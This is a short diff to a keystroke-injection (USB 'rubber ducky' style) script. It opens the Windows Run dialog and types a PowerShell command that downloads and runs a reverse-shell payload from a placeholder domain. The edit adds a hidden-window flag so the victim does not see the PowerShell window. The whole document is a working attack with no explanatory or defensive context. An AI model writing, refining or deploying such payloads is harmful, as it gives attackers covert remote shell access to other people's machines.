@@ -1,5 +1,5 @@
 DELAY 1000
 GUI r
 DELAY 100
-STRING powershell "IEX (New-Object Net.WebClient).DownloadString('<DOMAIN>/rev_shell_payload.txt');"
+STRING powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('<DOMAIN>/rev_shell_payload.txt');"
 ENTER
